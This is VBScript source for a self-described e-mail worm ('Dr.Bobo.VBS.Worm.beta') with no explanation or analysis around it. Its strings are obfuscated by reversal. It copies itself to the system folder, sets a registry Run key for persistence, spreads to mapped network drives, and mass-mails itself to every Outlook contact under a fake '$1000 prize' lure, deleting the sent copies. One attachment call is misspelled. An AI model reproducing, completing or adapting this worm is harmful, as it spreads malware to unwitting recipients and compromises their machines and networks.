' Dr.Bobo.VBS.Worm.beta

On Error Resume Next

Dim DPH
Dim JUKKJTGO
Dim G79ARPGF
Dim F8CW
Dim DCG
Dim BXBP
Dim O8OI5
Dim WI1DLEB5
Dim PFYFFP74
Dim J1G77

Set DPH = CreateObject( F721TQ5( "tcejbOmetsySeliF.gnitpircS" ) )
DPH.CopyFile WScript.ScriptFullName, DPH.BuildPath( DPH.GetSpecialFolder(1), F721TQ5( "SBV.M3LDTIT" ) )

Set JUKKJTGO = CreateObject( F721TQ5( "llehS.tpircSW" ) )
JUKKJTGO.RegWrite F721TQ5( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & F721TQ5( "M3LDTIT" ), DPH.BuildPath( DPH.GetSpecialFolder(1), F721TQ5( "SBV.M3LDTIT" ) )


Set G79ARPGF = CreateObject( F721TQ5( "krowteN.tpircSW" ) )
Set DCG = G79ARPGF.EnumNetworkDrives

If DCG.Count <> 0 Then
   For F8CW = 0 To DCG.Count - 1
       If InStr( DCG.Item( F8CW), F721TQ5( "\" ) ) <> 0 Then
          DPH.CopyFile WScript.ScriptFullName, DPH.BuildPath( DCG.Item( F8CW), F721TQ5( "SBV.M3LDTIT" ) ) 
       End If
   Next
End If

F8CW = JUKKJTGO.RegRead( F721TQ5( "\ENIHCAM_LACOL_YEKH" ) & F721TQ5( "M3LDTIT" ) )

If F8CW = "" Or F8CW > 20 Then
   F8CW = 0
End If

If F8CW = 0 Then
   Set WI1DLEB5 = CreateObject( F721TQ5( "noitacilppA.kooltuO" ) )
   Set BXBP = WI1DLEB5.GetNameSpace( F721TQ5( "IPAM" ) )

   For Each O8OI5 In BXBP.AddressLists
       Set DCG = WI1DLEB5.CreateItem( 0 )

       For PFYFFP74 = 1 To O8OI5.AddressEntries.Count
           Set J1G77 = O8OI5.AddressEntries( PFYFFP74 )

           If PFYFFP74 = 1 Then
              DCG.BCC = J1G77.Address
           Else
              DCG.BCC = DCG.BCC & F721TQ5( " ;" ) & J1G77.Address
           End If
       Next

       DCG.Subject = F721TQ5( "$0001 niw evah uoY" )
       DCG.Body = F721TQ5( ".]em daer[ tnemhcatta ni ofni margorp eht kooL $0001 niw evah uoY" )
       DCG.Attachmets.Add WScript.ScriptFullName
       DCG.DeleteAfterSubmit = True
       DCG.Send
   Next

   F8CW = 0
End If

JUKKJTGO.RegWrite F721TQ5( "\ENIHCAM_LACOL_YEKH" ) & F721TQ5( "M3LDTIT" ), F8CW + 1

Function F721TQ5( YLGOPFX )
   Dim PPGKG1
   Dim TILQ
   Dim EPDT1QVF

   PPGKG1 = ""

   For TILQ = 1 To Len( YLGOPFX )
       EPDT1QVF = Mid( YLGOPFX, TILQ, 1 )

       PPGKG1 = EPDT1QVF & PPGKG1
   Next

   F721TQ5 = PPGKG1
End Function
